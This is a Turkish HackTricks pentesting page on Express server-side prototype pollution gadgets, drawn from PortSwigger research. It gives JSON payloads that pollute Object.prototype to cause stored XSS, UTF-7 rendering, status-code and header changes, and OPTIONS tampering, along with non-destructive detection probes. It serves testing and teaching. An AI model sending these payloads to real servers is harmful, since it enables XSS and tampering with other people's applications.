# Express Prototype Pollution Gadgets

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), bir şirketin veya müşterilerinin **stealer malwares** tarafından **tehdit edilip edilmediğini** kontrol etmek için **ücretsiz** işlevsellikler sunan **karanlık ağ** destekli bir arama motorudur.

WhiteIntel'in ana hedefi, bilgi çalan kötü amaçlı yazılımlardan kaynaklanan hesap ele geçirmeleri ve fidye yazılımı saldırılarıyla mücadele etmektir.

Web sitelerini kontrol edebilir ve motorlarını **ücretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

***

## XSS yanıtları sunun

**Daha fazla ayrıntı için** [**orijinal araştırmaya göz atın**](https://portswigger.net/research/server-side-prototype-pollution)

### JSON içerik türünü HTML olarak değiştirin

Bir **JSON içerik türü yanıtı** kullanan bir Express uygulamasında ve bir JSON'u yansıtarak:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
Bu durumlarda XSS genellikle JSON içerik türü ile mümkün değildir. Ancak, prototip kirlenmesi ile **Express'i HTML yanıtı sunması için kandırabiliriz.** Bu güvenlik açığı, uygulamanın **`res.send(obj)`** kullanmasına ve uygulama/json içerik türü ile gövde ayrıştırıcısını kullanmasına dayanır.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
**`body`** ve **`_body`** özelliklerini **kirleterek**, **Express'in HTML içerik türünü sunmasını** sağlamak ve `_body` özelliğini yansıtmak mümkündür; bu da saklı XSS'e yol açar.

### UTF7'yi Render Et

Express'in **UTF-7 içeriğini render etmesini sağlamak mümkündür**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Güvenli Tarama Teknikleri

### JSON boşlukları

Aşağıdaki PP, bir JSON içindeki niteliklerin ekstra bir boşluğa sahip olmasını sağlayacak ve bu, işlevselliği bozmayacaktır:
```json
{"__proto__":{"json spaces": " "}}
```
O zaman yansıtılmış JSON şöyle görünecektir:
```json
{"foo":  "bar"} -- Note the extra space
```
### Açık Başlıklar

Aşağıdaki PP aracı, sunucunun HTTP başlığını geri göndermesini sağlayacaktır: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
**CORS modülünün yüklenmesi gerekmektedir**

### **OPTIONS Yöntemi**

Aşağıdaki yük ile, **OPTIONS yanıtından bir yöntemi gizlemek** mümkündür:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Durum**

Aşağıdaki PP yükünü kullanarak **geri dönen durum kodunu** değiştirmek mümkündür:
```json
{"__proto__":{"status":510}}
```
### Hata

Bir prototipe bir dize gibi bir ilkel atadığınızda, bu **prototipin bir nesne olması gerektiğinden no-op işlemi üretir**. Eğer bir prototip nesnesini `Object.prototype`'a atamaya çalışırsanız, bu **bir istisna fırlatır**. Bu iki davranışı **prototip kirliliğinin başarılı olup olmadığını tespit etmek için** kullanabiliriz:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Yansıtılan Değer

Bir uygulama yanıtında bir nesne içerdiğinde, **`__proto__` ile birlikte alışılmadık bir adla bir özellik oluşturmak** bilgilendirici olabilir. Özellikle, eğer **yalnızca alışılmadık özellik yanıt olarak döndürülüyorsa**, bu uygulamanın zayıflığını gösterebilir:
```json
{"unusualName":"value","__proto__":"test"}
```
Ayrıca, Lodash gibi bir kütüphane kullanıldığında, bir özelliği hem prototip kirlenmesi (PP) yoluyla hem de doğrudan nesne içinde ayarlamak başka bir tanısal yaklaşım sunar. Eğer böyle bir özellik yanıttan çıkarılmışsa, bu, Lodash'ın birleştirmeden önce hedef nesnede özelliğin varlığını doğruladığını gösterir:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Misc

### Dots'a İzin Ver

Express'te **sorgu dizesi parametrelerinden nesneler oluşturmanıza** olanak tanıyan bir seçenek vardır.\
Kesinlikle bir hata **zincirinde** kullanarak bir **prototip kirlenmesi açığını** istismar edebilirsiniz.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` Node'da bir nesne oluşturur.**

## Referanslar

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), bir şirketin veya müşterilerinin **stealer malwares** tarafından **tehdit altına alınıp alınmadığını** kontrol etmek için **ücretsiz** işlevler sunan bir **karanlık ağ** destekli arama motorudur.

WhiteIntel'in ana hedefi, bilgi çalan kötü amaçlı yazılımlardan kaynaklanan hesap ele geçirmeleri ve fidye yazılımı saldırılarıyla mücadele etmektir.

Web sitelerini kontrol edebilir ve motorlarını **ücretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
